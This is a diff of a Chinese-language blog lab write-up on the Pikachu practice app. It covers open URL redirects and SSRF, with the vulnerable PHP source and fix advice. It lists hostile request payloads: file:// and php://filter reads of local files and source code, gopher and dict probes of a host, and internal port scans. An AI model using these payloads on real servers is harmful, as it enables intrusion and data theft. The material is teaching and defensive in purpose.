+<p>不安全的URL跳转问题可能发生在一切执行了URL地址跳转的地方。<br>如果后端采用了前端传进来的参数(可能是用户传参,或者之前预埋在前端页面的URL地址)作为了跳转的目的地,而又没有做判断的话就可能发生”跳错对象”的问题。</p>
+<p>URL跳转比较直接的危害是:–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p>
+</blockquote>
+<p>1.进入页面是四个超链接，依次点一遍，点到最后一句时，发现URL带有参数</p>
+<pre class="line-numbers language-url"><code class="language-url">http://127.0.0.1/pikachu-master/vul/urlredirect/urlredirect.php?url=i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>2.我们可以直接把参数<code>i</code>,改为钓鱼网站的网址，这里我就假设我的博客是钓鱼网站</p>
+<pre class="line-numbers language-url"><code class="language-url">http://127.0.0.1/pikachu-master/vul/urlredirect/urlredirect.php?url=https://jwt1399.top<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>3.把上面这个URL发送给用户，用户点击就会跳转到钓鱼网站</p>
+<p><strong>源码分析</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$url</span> <span class="token operator">==</span> <span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$html</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token string">"&lt;p>好的,希望你能坚持做你自己!&lt;/p>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:{$url}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过GET请求获取前端传进来的url，判断是否等于i，如果不等，就跳转到url对应的地址去。这就存在URL重定向问题。</p>
+<p> <strong>修复</strong></p>
+<p>对url进行白名单的限制，如果不在白名单，就跳转到固定的页面</p>
+<h2 id="SSRF（服务器端请求伪造）"><a href="#SSRF（服务器端请求伪造）" class="headerlink" title="SSRF（服务器端请求伪造）"></a>SSRF（服务器端请求伪造）</h2><blockquote>
+<p>SSRF(Server-Side Request Forgery:服务器端请求伪造)，其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p>
+<p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
+<p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
+<p>简单理解：服务器接受了客户端输入的URL，然后服务器端拿URL去请求并返回给你。</p>
+</blockquote>
+<p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p>
+<pre><code>PHP中下面函数的使用不当会导致SSRF:
+file_get_contents()
+fsockopen()
+curl_exec()    </code></pre><p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,<strong>则请做好目标地址的过滤</strong>。</p>
+<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</p>
+<p>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</p>
+<p>curl函数参考：<a href="https://www.runoob.com/php/php-ref-curl.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-ref-curl.html</a></p>
+<pre><code>//file协议读取
+?url=file:///D://jwt.txt
+
+//gopher协议
+//基本协议格式：URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流
+?url=gopher://119.23.243.154:22
+
+//dict协议
+?url=dict://119.23.243.154:22
+
+//http/https协议
+?url=http://x.x.x.x/
+?url=https://x.x.x.x/
+
+//探测内网其他主机的端口
+?url=http://x.x.x.x:port</code></pre><table>
+<thead>
+<tr>
+<th>file协议</th>
+<th>http/https协议</th>
+<th>端口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200715182340.png" alt></td>
+<td><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200715182343.png" alt></td>
+<td><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200715182346.png" alt></td>
+</tr>
+</tbody></table>
+<p><strong>源码分析</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span>
+    <span class="token variable">$URL</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$CH</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$RES</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$RES</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端，并且没做任何过滤或限制。从而导致了用户可能可以通过这个漏洞进行一些内网服务探测等等</p>
+<p>参考：<a href="https://segmentfault.com/a/1190000021810264" target="_blank" rel="noopener">SSRF原理实战及修复方式</a></p>
+<h3 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h3><p>file_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p>
+<p><strong>函数语法:</strong>  file_get_contents(path,include_path,context,start,max_length)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>path</td>
+<td>必需。规定要读取的文件。</td>
+</tr>
+<tr>
+<td>include_path</td>
+<td>可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。</td>
+</tr>
+<tr>
+<td>context</td>
+<td>可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。</td>
+</tr>
+<tr>
+<td>start</td>
+<td>可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。</td>
+</tr>
+<tr>
+<td>max_length</td>
+<td>可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。</td>
+</tr>
+</tbody></table>
+<pre><code>//file协议读取
+?file=file:///D://jwt.txt
+
+//读取php源码
+?file=php://filter/read=convert.base64-encode/resource=ssrf.php
+
+//内网其它主机请求
+?file=http://x.x.x.x/xx.index
+
+//探测内网其他主机的端口
+?file=http://x.x.x.x:port
+</code></pre><p><strong>源码分析</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>直接访问获取到的文件</p>
+<p><strong>SSRF修复</strong></p>
+<p>1.可以采取白名单,限制内网Ip。<br>2.对返回内容进行识别<br>3.禁用一些不必要的协议<br>4.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态</p>
+<p>参考：<a href="https://wiki.x10sec.org/web/ssrf/" target="_blank" rel="noopener">CTF Wiki-SSRF</a>、<a href="https://hackmd.io/@Lhaihai/H1B8PJ9hX?type=view#SSRF-学习记录" target="_blank" rel="noopener">SSRF 学习记录</a>、<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p>
+<h3 id="CTF实例-1"><a href="#CTF实例-1" class="headerlink" title="CTF实例"></a>CTF实例</h3><p>题目：hackme–XSSRF</p>
+<p>题目地址：<a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">https://xssrf.hackme.inndy.tw/</a></p>
+<p>解题思路：</p>
+<p>这个题一共有三关，xss-&gt;ssrf-&gt;redis</p>
+<p>参考：</p>
+<p><a href="https://www.anquanke.com/post/id/156377" target="_blank" rel="noopener">XSS的威力：从XSS到SSRF再到Redis</a></p>
+<p><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/" target="_blank" rel="noopener">xss-&gt;ssrf-&gt;redis</a></p>
+<p><a href="http://www.northity.com/2018/10/23/XSSme题目复现/" target="_blank" rel="noopener">XSSme题目复现</a></p>
+<h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭</p>
 <table>
   <tbody>
      <tr>
@@ -1733,7 +2092,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">156.5k</span>&nbsp;字
+                class="white-color">164.1k</span>&nbsp;字
             
             
             
